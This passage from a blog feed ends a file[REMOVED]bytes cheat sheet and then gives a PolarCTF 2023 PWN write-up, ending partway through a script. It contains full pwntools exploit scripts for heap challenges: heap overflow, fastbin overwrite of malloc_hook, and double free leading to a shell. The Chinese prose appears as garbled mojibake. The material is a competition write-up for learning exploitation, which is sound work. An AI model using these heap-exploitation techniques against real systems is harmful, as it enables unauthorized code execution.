title="5ã€è§†é¢‘æ–‡ä»¶"></a><strong>5ã€è§†é¢‘æ–‡ä»¶</strong></h4><ul><li>AVI (avi) æ–‡ä»¶å¤´ï¼š<code>41 56 49 20</code></li><li>Real Audio (ram) æ–‡ä»¶å¤´ï¼š<code>2E 72 61 FD</code></li><li>Real Media (rm) æ–‡ä»¶å¤´ï¼š<code>2E 52 4D 46</code></li><li>MPEG (mpg) æ–‡ä»¶å¤´ï¼š<code>00 00 01 BA(3)</code></li><li>Quicktime (mov) æ–‡ä»¶å¤´ï¼š<code>6D 6F 6F 76</code></li><li>Windows Media (asf) æ–‡ä»¶å¤´ï¼š<code>30 26 B2 75 8E 66 CF 11</code></li><li>MIDI (mid) æ–‡ä»¶å¤´ï¼š<code>4D 54 68 64</code></li></ul><h4 id="6ã€ä»£ç æ–‡ä»¶"><a href="#6ã€ä»£ç æ–‡ä»¶" class="headerlink" title="6ã€ä»£ç æ–‡ä»¶"></a><strong>6ã€ä»£ç æ–‡ä»¶</strong></h4><ul><li>XML (xml) æ–‡ä»¶å¤´ï¼š<code>3C 3F 78 6D 6C</code></li><li>HTML (html) æ–‡ä»¶å¤´ï¼š<code>68 74 6D 6C 3E</code></li><li>Quicken (qdf) æ–‡ä»¶å¤´ï¼š<code>AC 9E BD 8F</code></li><li>Windows Password (pwl) æ–‡ä»¶å¤´ï¼š<code>E3 82 85 96</code></li></ul><h4 id="7ã€å…¶ä»–ç±»å‹"><a href="#7ã€å…¶ä»–ç±»å‹" class="headerlink" title="7ã€å…¶ä»–ç±»å‹"></a><strong>7ã€å…¶ä»–ç±»å‹</strong></h4><ul><li>windowsè¯ä¹¦æ–‡ä»¶(der) æ–‡ä»¶å¤´ï¼š<code>30 82 03 C9</code></li><li>CAD (dwg) æ–‡ä»¶å¤´ï¼š<code>41 43 31 30</code></li><li>Windows Shortcut (lnk) æ–‡ä»¶å¤´ï¼š<code>4C 00 00 00</code></li><li>Windows reg(reg) æ–‡ä»¶å¤´ï¼š<code>52 45 47 45 44 49 54 34</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“-CTFä¸­Miscå¿…å¤‡&quot;&gt;&lt;a href=&quot;#å¸¸è§æ–‡ä»¶æ–‡ä»¶å¤´å’Œéšå†™æœ¯æ€»ç»“-CTFä¸­Mis</summary>
      
    
    
    
    <category term="Misc" scheme="https://kylinxin.github.io/categories/Misc/"/>
    
    
    <category term="misc" scheme="https://kylinxin.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PolarCTF_2023_wp</title>
    <link href="https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/"/>
    <id>https://kylinxin.github.io/2023/09/27/PolarCTF_2023_wp/</id>
    <published>2023-09-27T15:14:29.000Z</published>
    <updated>2023-09-30T09:10:52.078Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><blockquote><p>è®°å½•ä¸€ä¸‹ ä¸€æ¬¡æ¯”èµ›çš„å¤ç›˜ï¼Œé™¤äº†å¤•é˜³ä¸‹çš„èˆè€…æœ‰ç‚¹éš¾åº¦ä¹‹å¤–ï¼Œå…¶ä»–é¢˜ç›®éš¾åº¦è¿˜é€‚ä¸­ï¼Œæœ€åä¹Ÿæ˜¯æ‹¿åˆ°äº†ä¸é”™çš„æ’åï¼æœŸå¾…12æœˆä»½çš„Polar D&amp;Nçš„å†¬å­£èµ›ï¼</p></blockquote><p class='item-img' data-src='https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png'><img src="https://s2.loli.net/2023/09/30/ENZdsnHgIiDKFzQ.png" alt="image.png"></p><p>æœ€åæ¯é“é¢˜ç›®éƒ½æœ‰å®˜æ–¹è§†é¢‘è®²è§£ï¼Œé“¾æ¥ <a href="https://www.bilibili.com/video/BV1fr4y1Z73F?p=1&amp;vd_source=5c5a710dfdccbb5b7b821586612058bd">ã€PWNã€‘å°ç‹—æ±ªæ±ªæ±ª_å“”å“©å“”å“©_bilibili</a></p><h2 id="emo-chunk"><a href="#emo-chunk" class="headerlink" title="emo_chunk"></a>emo_chunk</h2><h3 id="ç¨‹åºä¿æŠ¤"><a href="#ç¨‹åºä¿æŠ¤" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><ul><li>å †æº¢å‡ºï¼Œå¯ä»¥é€šè¿‡æº¢å‡ºchunkå†…å®¹ï¼Œä»è€Œä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeå­—æ®µï¼Œåˆ¶é€ å †å—é‡å ï¼Œå°†ä¸‹ä¸€ä¸ªchunkå¤§å°æ”¹ä¸ºsmall chunkï¼Œè¿™æ ·freeæ‰ä¹‹åï¼Œä¼šæ”¾å…¥unsortedbinä¸­ï¼Œfdå’Œbkéƒ½æŒ‡å‘main_arena_88</li><li>ç„¶åå¯ä»¥é€šè¿‡æ‰“å°å‡½æ•°æ³„éœ²libcåœ°å€</li><li>åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼Œå‘malloc_hook-0x23çš„ä½ç½®ç”³è¯·chunkï¼Œè¦†å†™malloc_hook</li></ul><blockquote><p>æ³¨æ„ä¸€èˆ¬æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œä½†æ˜¯é¢˜ç›®å…·ä½“è¦ä½¿ç”¨realloc_hookæ¥è¿›è¡Œè°ƒæ ˆï¼Œå…·ä½“æ“ä½œä¸ºæ”¹realloc_hookä¸ºonegadgetï¼Œmalloc_hookä¸ºrealloc_hookï¼Œè¿™æ ·æ‰§è¡Œmallocæ—¶ï¼Œä¼šå®ç°äºŒçº§è·³ã€‚malloc_hook -&gt; realloc_hook -&gt; onegadget</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    p = process(<span class="hljs-string">'./emo_chunk'</span>)<br>    <span class="hljs-comment">#p = remote('123.60.135.228',2064)</span><br>    elf = ELF(<span class="hljs-string">'./emo_chunk'</span>)<br>    libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'Please Choice!\n'</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input Size:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br>    p.recvuntil(<span class="hljs-string">'Change EMo Content\n'</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    cmd(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please Input index:\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    cmd(<span class="hljs-string">"5"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">i,j</span>):<br><br>    heaparray = <span class="hljs-number">0x6020E0</span><br>    backdoor = <span class="hljs-number">0x400946</span><br>    free_got = elf.got[<span class="hljs-string">'free'</span>]<br><br>    <span class="hljs-comment">#åˆ›å»ºå‡ ä¸ªchunk</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#0</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#2</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5 éš”ç¦»top chunk</span><br><br>    <span class="hljs-comment">#æ³„éœ²libc</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">'\xe1'</span> + <span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#1</span><br>    show(<span class="hljs-number">2</span>)<br>    libc_base = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base -&gt; "</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#è®¡ç®—åœ°å€</span><br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br><br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br>    one_gadget = libc_base + one[i]<br><br>    delete(<span class="hljs-number">4</span>)<br><br>    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x23</span>))<br>    <span class="hljs-comment">#debug()</span><br><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#4</span><br>    add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#malloc 6</span><br><br>    <span class="hljs-comment">#æ€è·¯1,å°†malloc_hookæ”¹æˆone_gadgetï¼Œä½†æ˜¯æ‰“ä¸é€š</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10) + p64(one_gadget)</span><br>    <span class="hljs-comment">#æ€è·¯2,å°†realloc_hookæ”¹æˆone_gadget,è°ƒæ ˆ</span><br>    <span class="hljs-comment">#payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #å°†malloc_hookä¿®æ”¹æˆrealloc_hook</span><br>    <span class="hljs-comment">#æ€è·¯3,é¢˜ç›®æœ‰åé—¨,ç›´æ¥æ”¹malloc_hookä¸ºåé—¨å‡½æ•°</span><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>) + p64(backdoor)<br>    edit(<span class="hljs-number">6</span>,payload)<br><br>    add(<span class="hljs-number">0x68</span>)<br><br>    p.interactive()<br><br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#æ³¨é‡Šä¸ºæš´åŠ›è°ƒæ ˆ,å¾—å‡ºi = 1, j = 8</span><br><br>connect()<br>pwn(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><h2 id="double-free"><a href="#double-free" class="headerlink" title="double  free"></a>double  free</h2><h3 id="ç¨‹åºä¿æŠ¤-1"><a href="#ç¨‹åºä¿æŠ¤-1" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-1"><a href="#è§£é¢˜æ€è·¯-1" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>double free å¯ä»¥ç”³è¯·ä»»ä½•æˆ‘ä»¬æƒ³è¦çš„åœ°å€çš„ä¸€ä¸ªchunkï¼Œè¿›è€Œä¿®æ”¹å†…å®¹ï¼Œæœ¬é¢˜ç›®å°±æ˜¯ä¿®æ”¹bssæ®µä¸Šçš„å€¼ä¸ºå›ºå®šå€¼ï¼Œè¿›è€Œgetshellï¼Œå…·ä½“åšæ³•å°±æ˜¯ç”³è¯·2ä¸ªchunkï¼Œåˆ¶é€ double ï¼Œfreeï¼Œå½¢æˆchunk 1 -&gt; chunk 2 &lt;- chunk 1ï¼Œä¿®æ”¹chunk 1 çš„æŒ‡å‘ä¸ºç›®æ ‡åœ°å€ï¼Œç„¶åé€šè¿‡è¿ç»­çš„malloc 4æ¬¡ï¼Œæ—¢å¯ç”³è¯·åˆ°ç›®æ ‡åœ°å€ï¼Œæœ€åä¿®æ”¹chunkå†…å®¹å³å¯</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">'linux'</span>, arch=<span class="hljs-string">'amd64'</span>, log_level=<span class="hljs-string">'debug'</span>)<br>p = process(<span class="hljs-string">'./heap_Double_Free'</span>)<br><span class="hljs-comment">#p = remote('123.60.135.228',2133)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">xuhao</span>):<br>    p.recvuntil(<span class="hljs-string">'root@ubuntu:~/Desktop$ '</span>)<br>    p.sendline(xuhao)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size,content</span>):<br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'please input id and size :\n'</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"2"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cmd(<span class="hljs-string">"3"</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>    cmd(<span class="hljs-string">"4"</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><br>goal = <span class="hljs-number">0x6010b0</span> <span class="hljs-comment">#å°†è¿™é‡Œçš„å€¼æ”¹ä¸º 257</span><br>fd = <span class="hljs-number">0x6010b0</span><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'bbbb'</span>) <span class="hljs-comment">#1</span><br><span class="hljs-comment">#create(2,16,'cccc') #2 é˜²æ­¢å’Œtopchunkåˆå¹¶</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#double free</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(goal-<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#3</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0x101</span>)) <span class="hljs-comment">#6</span><br>debug()<br>getshell()<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="easychunk"><a href="#easychunk" class="headerlink" title="easychunk"></a>easychunk</h2><h3 id="ç¨‹åºä¿æŠ¤-2"><a href="#ç¨‹åºä¿æŠ¤-2" class="headerlink" title="ç¨‹åºä¿æŠ¤"></a>ç¨‹åºä¿æŠ¤</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure><h3 id="è§£é¢˜æ€è·¯-2"><a href="#è§£é¢˜æ€è·¯-2" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>offbynull </p><ul><li>ç”³è¯·4ä¸ªchunkï¼Œfreeæ‰chunk 0ã€‚ç„¶åç¼–è¾‘chunk1ï¼Œè¦†å†™chunk2çš„prev_sizeä¸ºchunk0 + chun1ï¼Œsizeä½ä½ä¸º0ï¼Œè¡¨ç¤ºå‰é¢çš„chunkä¸ºfree chunk</li><li>chunk 0 chunk 1 ä¼šåˆå¹¶ï¼Œä½†æ˜¯ chunk 1 å§‹ç»ˆå­˜åœ¨ï¼Œåˆå¹¶åæ”¾å…¥äº†unsorted bin ä¸­ï¼Œç”³è¯·ä¸€ä¸ªåŒæ ·å¤§å°çš„chunk 5æ”¶å›chunk0ï¼Œè¿™æ ·chunk 1çš„fd å’Œbkéƒ½æ˜¯main_arena_88ï¼Œæ³„éœ²libcåœ°å€</li><li>æœ€åé€šè¿‡fastbinå‘malloc_hook-0x23ç”³è¯·åœ°å€ï¼Œæœ€åä¿®æ”¹malloc_hook ä¸º og</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote('123.60.135.228',2094)</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process(<span class="hljs-string">'./easychunk'</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2114</span>)<br>    elf = ELF(<span 